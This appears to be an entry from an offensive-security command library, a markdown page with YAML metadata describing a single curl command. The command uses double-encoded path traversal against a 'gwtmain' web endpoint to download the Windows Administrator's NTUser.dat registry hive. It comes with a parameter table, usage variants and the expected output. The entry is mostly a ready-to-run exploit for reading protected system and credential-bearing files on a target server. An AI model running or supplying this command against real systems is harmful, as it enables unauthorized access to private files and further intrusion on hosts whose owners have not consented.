---
id: cmd-uuid-4
data: >-
  curl -X GET
  "https://target-domain/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fUsers/Administrator/NTUser.dat"
  -H "Host: target-domain" -H "Accept-Encoding: gzip, deflate" -H "Accept: */*"
  -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0;
  Windows NT 6.1; Win64; x64; Trident/5.0)" --connect-timeout 10 -v --output
  ntuser.dat
tags:
  - path-traversal
  - lfi
  - admin
type: command
output: null
executor: bash
platforms:
  - Web
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.920Z'
verified: false
validated: true
submitted: true
---
# curl-path-traversal-ntuser

## Command

```bash
curl -X GET "https://target-domain/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fUsers/Administrator/NTUser.dat" -H "Host: target-domain" -H "Accept-Encoding: gzip, deflate" -H "Accept: */*" -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" --connect-timeout 10 -v --output ntuser.dat
```

## Description

Exploits path traversal to download the Administrator's NTUser.dat file, verifying admin privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| `Path` | Traversal to NTUser.dat | Yes |
| `-H "Host: ..."` | Target domain | Yes |
| `--output ntuser.dat` | Save response to file | Yes |
| `-v` | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target-domain/gwtmain/[traversal]/NTUser.dat" -H "User-Agent: Mozilla/5.0" --output ntuser.dat
```

### Advanced Usage

```bash
curl -X GET "https://target-domain/gwtmain/[traversal]/NTUser.dat" -H "User-Agent: Mozilla/5.0" -v --output ntuser.dat
```

## Expected Output

200 OK; binary file saved as ntuser.dat, containing registry hive data.

## Related

- [[Related Procedure: Verify-Admin-Privileges-via-Restricted-File-Access]]
